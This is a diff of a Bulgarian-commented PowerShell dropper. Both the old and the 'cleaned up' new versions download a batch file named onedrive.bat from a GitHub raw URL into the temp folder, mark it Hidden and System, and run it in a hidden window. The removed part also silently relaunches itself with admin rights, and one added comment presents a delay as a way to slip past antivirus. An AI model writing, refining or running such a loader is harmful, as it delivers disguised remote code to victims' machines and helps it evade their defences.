@@ -1,51 +1,54 @@
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $scriptContent = @'
-    $ErrorActionPreference = "SilentlyContinue"
-    $url = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
-    $file = "$env:TEMP\onedrive.bat"
-    Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing
-    if (Test-Path $file) {
-        # Скриване на файла (Hidden + System)
-        $item = Get-Item $file -Force
-        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
-        Start-Process $file
-    }
-'@
-    
-    $tempFile = [System.IO.Path]::GetTempFileName() + ".ps1"
-    $scriptContent | Set-Content $tempFile -Encoding UTF8
-    Start-Process PowerShell "-NoProfile -ExecutionPolicy Bypass -File `"$tempFile`"" -Verb RunAs -WindowStyle Hidden
-    exit
-}
+# =============================================================================
+# Почистен и подобрен вариант – без самоповишаване на права
+# =============================================================================
 
-# -----------------------------------------------------------------
-# Частта, която се изпълнява вече с права на администратор
-# -----------------------------------------------------------------
+# Скриптът предполага, че се изпълнява с нужните права
+# Ако няма права – просто няма да може да скрие файла или да го стартира с определени привилегии
 
 $ErrorActionPreference = "SilentlyContinue"
 
-$url = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
-$file = "$env:TEMP\onedrive.bat"
+# Път до файла (в temp – стандартно място)
+$batFile = "$env:TEMP\onedrive.bat"
+$url      = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
 
-# Изтриваме стара версия ако съществува
-if (Test-Path $file) { 
-    Remove-Item $file -Force -ErrorAction SilentlyContinue 
+# 1. Изтриваме стара версия, ако съществува
+if (Test-Path $batFile) {
+    Remove-Item $batFile -Force
 }
 
-Start-Sleep -Milliseconds 800
+# Малко изчакване – понякога помага при антивирус/защитни механизми
+Start-Sleep -Milliseconds 600
 
-Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing
+# 2. Изтегляме файла
+try {
+    Invoke-WebRequest -Uri $url -OutFile $batFile -UseBasicParsing -TimeoutSec 15
+}
+catch {
+    # Ако нещо се обърка – тихо излизаме (или можеш да сложиш Write-Host / лог)
+    exit 1
+}
 
-Start-Sleep -Milliseconds 1200
+# 3. Проверяваме дали файлът е изтеглен успешно
+if (-not (Test-Path $batFile)) {
+    # Можеш да добавиш съобщение, ако искаш обратна връзка
+    # Write-Host "Не успях да изтегля файла." -ForegroundColor Red
+    exit 1
+}
 
-if (Test-Path $file) {
-    # Скриване на файла (Hidden + System атрибути)
-    $item = Get-Item $file -Force
+# 4. Скриване на файла (Hidden + System)
+try {
+    $item = Get-Item $batFile -Force
     $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
-    
-    Start-Process $file
-    Write-Host " " -ForegroundColor Green
-} else {
-    Write-Host " " -ForegroundColor Red
+}
+catch {
+    # Ако не може да сложи атрибути – продължаваме все пак
 }
 
+# 5. Стартираме файла скрито
+Start-Process -FilePath $batFile -WindowStyle Hidden -NoNewWindow
+
+# Опционално – малко визуално потвърждение (махни ако не ти трябва)
+# Write-Host "Стартирано." -ForegroundColor Green
+
+# Край
+exit 0
